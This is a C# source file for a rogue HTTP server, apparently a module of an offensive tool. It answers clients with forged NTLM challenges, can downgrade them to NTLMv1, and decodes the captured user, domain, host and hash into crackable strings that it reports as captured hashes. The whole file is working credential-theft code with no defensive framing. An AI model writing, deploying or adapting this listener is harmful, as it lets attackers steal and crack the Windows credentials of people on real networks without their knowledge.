using Workflow.Contracts;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace Workflow
{
    public class FarmerServer
    {
        private ILogger logger { get; set; }
        private IDataBroker messageManager { get; set; }
        private TcpListener? _listener;
        private string task_id { get; set; }
        private bool _downgrade;
        private string _serverHeader;
        private byte[] _challenge;

        public FarmerServer(
            ILogger logger,
            IDataBroker manager,
            string task_id,
            bool downgrade,
            string serverHeader)
        {
            this.logger = logger;
            this.messageManager = manager;
            this.task_id = task_id;
            _downgrade = downgrade;
            _serverHeader = serverHeader;
            _challenge = GenerateChallenge();
        }

        public void Initialize(int port, string bindAddress)
        {
            var address = System.Net.IPAddress.Any;
            if (!string.IsNullOrEmpty(bindAddress))
            {
                address = System.Net.IPAddress.Parse(bindAddress);
            }

            _listener = new TcpListener(address, port);
            _listener.Start();
            ThreadPool.QueueUserWorkItem(this.ListenerWorker, null);
        }

        public void Stop()
        {
            if (_listener != null)
            {
                _listener.Stop();
                _listener = null;
            }
        }

        private static byte[] GenerateChallenge()
        {
            byte[] challenge = new byte[8];
            RandomNumberGenerator.Fill(challenge);
            return challenge;
        }

        private byte[] BuildType2Message()
        {
            string targetName = "SMB";
            byte[] targetNameBytes = Encoding.Unicode.GetBytes(targetName);

            var targetInfo = BuildTargetInfo(targetName);

            int targetNameOffset = 56;
            int targetInfoOffset = targetNameOffset + targetNameBytes.Length;
            int totalLength = targetInfoOffset + targetInfo.Length;

            byte[] msg = new byte[totalLength];
            int pos = 0;

            // Signature: NTLMSSP\0
            byte[] sig = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00 };
            Array.Copy(sig, 0, msg, pos, 8);
            pos += 8;

            // Type 2 message indicator
            WriteInt32(msg, pos, 2);
            pos += 4;

            // Target Name fields (len, maxlen, offset)
            WriteInt16(msg, pos, (short)targetNameBytes.Length);
            pos += 2;
            WriteInt16(msg, pos, (short)targetNameBytes.Length);
            pos += 2;
            WriteInt32(msg, pos, targetNameOffset);
            pos += 4;

            // Negotiate Flags
            uint flags = BuildNegotiateFlags();
            WriteUInt32(msg, pos, flags);
            pos += 4;

            // Server Challenge (8 bytes)
            Array.Copy(_challenge, 0, msg, pos, 8);
            pos += 8;

            // Reserved (8 bytes of zeros)
            pos += 8;

            // Target Info fields (len, maxlen, offset)
            WriteInt16(msg, pos, (short)targetInfo.Length);
            pos += 2;
            WriteInt16(msg, pos, (short)targetInfo.Length);
            pos += 2;
            WriteInt32(msg, pos, targetInfoOffset);
            pos += 4;

            // Target Name payload
            Array.Copy(targetNameBytes, 0, msg, targetNameOffset, targetNameBytes.Length);

            // Target Info payload
            Array.Copy(targetInfo, 0, msg, targetInfoOffset, targetInfo.Length);

            return msg;
        }

        private uint BuildNegotiateFlags()
        {
            // Base flags present in a standard Type 2 message
            uint flags = 0;
            flags |= 0x00000001; // NEGOTIATE_UNICODE
            flags |= 0x00000200; // NEGOTIATE_NTLM
            flags |= 0x00010000; // NEGOTIATE_ALWAYS_SIGN
            flags |= 0x00020000; // NEGOTIATE_TARGET_INFO
            flags |= 0x00008000; // NEGOTIATE_TARGET_TYPE_SERVER
            flags |= 0x00000004; // REQUEST_TARGET

            if (!_downgrade)
            {
                flags |= 0x00080000; // NEGOTIATE_EXTENDED_SESSIONSECURITY
            }

            return flags;
        }

        private static byte[] BuildTargetInfo(string targetName)
        {
            byte[] nameBytes = Encoding.Unicode.GetBytes(targetName);
            byte[] domainBytes = Encoding.Unicode.GetBytes(targetName);

            // Each AV_PAIR: Type(2) + Length(2) + Value(variable)
            // MsvAvNbDomainName(2) + MsvAvNbComputerName(1) + MsvAvEOL(0)
            int size = (2 + 2 + domainBytes.Length)
                     + (2 + 2 + nameBytes.Length)
                     + (2 + 2);
            byte[] info = new byte[size];
            int pos = 0;

            // MsvAvNbDomainName (type 2)
            WriteInt16(info, pos, 2); pos += 2;
            WriteInt16(info, pos, (short)domainBytes.Length); pos += 2;
            Array.Copy(domainBytes, 0, info, pos, domainBytes.Length);
            pos += domainBytes.Length;

            // MsvAvNbComputerName (type 1)
            WriteInt16(info, pos, 1); pos += 2;
            WriteInt16(info, pos, (short)nameBytes.Length); pos += 2;
            Array.Copy(nameBytes, 0, info, pos, nameBytes.Length);
            pos += nameBytes.Length;

            // MsvAvEOL (type 0)
            WriteInt16(info, pos, 0); pos += 2;
            WriteInt16(info, pos, 0);

            return info;
        }

        private static void WriteInt16(byte[] buf, int offset, short value)
        {
            buf[offset] = (byte)(value & 0xFF);
            buf[offset + 1] = (byte)((value >> 8) & 0xFF);
        }

        private static void WriteInt32(byte[] buf, int offset, int value)
        {
            buf[offset] = (byte)(value & 0xFF);
            buf[offset + 1] = (byte)((value >> 8) & 0xFF);
            buf[offset + 2] = (byte)((value >> 16) & 0xFF);
            buf[offset + 3] = (byte)((value >> 24) & 0xFF);
        }

        private static void WriteUInt32(byte[] buf, int offset, uint value)
        {
            buf[offset] = (byte)(value & 0xFF);
            buf[offset + 1] = (byte)((value >> 8) & 0xFF);
            buf[offset + 2] = (byte)((value >> 16) & 0xFF);
            buf[offset + 3] = (byte)((value >> 24) & 0xFF);
        }

        private void ListenerWorker(object token)
        {
            while (_listener != null)
            {
                try
                {
                    var client = _listener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(this.HandleClientWorker, client);
                }
                catch (Exception e)
                {
                    if (e.ToString().Contains("WSACancelBlockingCall"))
                    {
                        this.messageManager.Write(
                            Environment.NewLine + "Server Stopped",
                            this.task_id, true);
                    }
                    else
                    {
                        this.messageManager.Write(
                            e.ToString(), this.task_id, true, "error");
                    }
                }
            }
        }

        private void HandleClientWorker(object token)
        {
            try
            {
                var client = token as TcpClient;
                var stream = client.GetStream();
                using (var reader = new StreamReader(stream))
                {
                    var writer = new StreamWriter(stream);
                    var requestFinished = 0;
                    var method = "";
                    var uri = "";
                    var httpver = "";
                    var state = 0;

                    var headers = new Dictionary<string, string>();

                    while (requestFinished == 0)
                    {
                        if (state == 0)
                        {
                            var lineInput = reader.ReadLine();
                            var line = lineInput.Split(' ');
                            method = line[0];
                            uri = line[1];
                            httpver = line[2];
                            state = 1;
                        }
                        else
                        {
                            var lineInput = reader.ReadLine();
                            if (lineInput == "")
                            {
                                requestFinished = 1;
                                var body = "";
                                var response = HandleWebRequest(
                                    method, uri, httpver, headers, body);
                                writer.Write(response);
                                writer.Flush();
                                Thread.Sleep(3000);
                                client.Close();
                            }
                            else
                            {
                                int colonIndex = lineInput.IndexOf(':');
                                if (colonIndex > 0)
                                {
                                    string key = lineInput
                                        .Substring(0, colonIndex).Trim().ToLower();
                                    string value = lineInput
                                        .Substring(colonIndex + 1).TrimStart();
                                    headers[key] = value;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                if (e.ToString().Contains("WSACancelBlockingCall"))
                {
                    this.messageManager.Write(
                        Environment.NewLine + "Server Stopped",
                        this.task_id, true);
                }
                else
                {
                    this.messageManager.Write(
                        e.ToString(), this.task_id, true, "error");
                }
                this.Stop();
            }
        }

        private string HandleWebRequest(
            string method,
            string uri,
            string httpVersion,
            Dictionary<string, string> headers,
            string body)
        {
            if (!headers.ContainsKey("authorization"))
            {
                return $"HTTP/1.0 401 Unauthorized\r\n" +
                       $"Server: {_serverHeader}\r\n" +
                       "Content-Type: text/html\r\n" +
                       "WWW-Authenticate: NTLM\r\n" +
                       "X-Powered-By: ASP.NET\r\n" +
                       "Connection: Close\r\n" +
                       "Content-Length: 0\r\n\r\n";
            }

            var auth = headers["authorization"].Split();
            if (auth[0] == "NTLM")
            {
                auth[1] = auth[1].TrimStart();
                byte[] NTLMHash = Convert.FromBase64String(auth[1]);
                if (NTLMHash[8] == 3)
                {
                    StringBuilder sb = new StringBuilder();
                    var NTLMHashString = DecodeNTLM(NTLMHash);
                    sb.AppendLine("[*] Capture hash:");
                    sb.AppendLine(NTLMHashString);
                    this.messageManager.Write(
                        sb.ToString(), this.task_id, false);

                    return "HTTP/1.1 200 OK\r\n" +
                           "Content-Type: text/html\r\n" +
                           "Connection: Close\r\n" +
                           "Content-Length: 11\r\n\r\n" +
                           "Not Found\r\n";
                }
            }

            // Send NTLM Type 2 Challenge with dynamic challenge bytes
            byte[] type2 = BuildType2Message();
            string type2B64 = Convert.ToBase64String(type2);
            return $"HTTP/1.1 401 Unauthorized\r\n" +
                   $"Server: {_serverHeader}\r\n" +
                   "Content-Type: text/html\r\n" +
                   $"WWW-Authenticate: NTLM {type2B64}\r\n" +
                   "Connection: Close\r\n" +
                   "Content-Length: 0\r\n\r\n";
        }

        private string DecodeNTLM(byte[] NTLM)
        {
            var LMHash_len = BitConverter.ToInt16(NTLM, 12);
            var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
            var LMHash = NTLM.Skip(LMHash_offset).Take(LMHash_len).ToArray();
            var NTHash_len = BitConverter.ToInt16(NTLM, 20);
            var NTHash_offset = BitConverter.ToInt16(NTLM, 24);
            var NTHash = NTLM.Skip(NTHash_offset).Take(NTHash_len).ToArray();
            var User_len = BitConverter.ToInt16(NTLM, 36);
            var User_offset = BitConverter.ToInt16(NTLM, 40);
            var User = NTLM.Skip(User_offset).Take(User_len).ToArray();
            var UserString = Encoding.Unicode.GetString(User);

            string challengeHex = BitConverter
                .ToString(_challenge).Replace("-", "");

            if (NTHash_len == 24)
            {
                // NTLMv1
                var HostName_len = BitConverter.ToInt16(NTLM, 46);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset)
                    .Take(HostName_len).ToArray();
                var HostNameString = Encoding.Unicode.GetString(HostName);
                var LMHashString = BitConverter
                    .ToString(LMHash).Replace("-", "");
                var NTHashString = BitConverter
                    .ToString(NTHash).Replace("-", "");
                return UserString + "::" + HostNameString + ":"
                    + LMHashString + ":" + NTHashString
                    + ":" + challengeHex;
            }
            else if (NTHash_len > 24)
            {
                // NTLMv2
                NTHash_len = 64;
                var Domain_len = BitConverter.ToInt16(NTLM, 28);
                var Domain_offset = BitConverter.ToInt16(NTLM, 32);
                var Domain = NTLM.Skip(Domain_offset)
                    .Take(Domain_len).ToArray();
                var DomainString = Encoding.Unicode.GetString(Domain);
                var HostName_len = BitConverter.ToInt16(NTLM, 44);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset)
                    .Take(HostName_len).ToArray();
                var HostNameString = Encoding.Unicode.GetString(HostName);

                var NTHash_part1 = BitConverter
                    .ToString(NTHash.Take(16).ToArray()).Replace("-", "");
                var NTHash_part2 = BitConverter
                    .ToString(NTHash.Skip(16).Take(NTLM.Length).ToArray())
                    .Replace("-", "");
                return UserString + "::" + DomainString
                    + ":" + challengeHex + ":"
                    + NTHash_part1 + ":" + NTHash_part2;
            }
            return "";
        }
    }
}
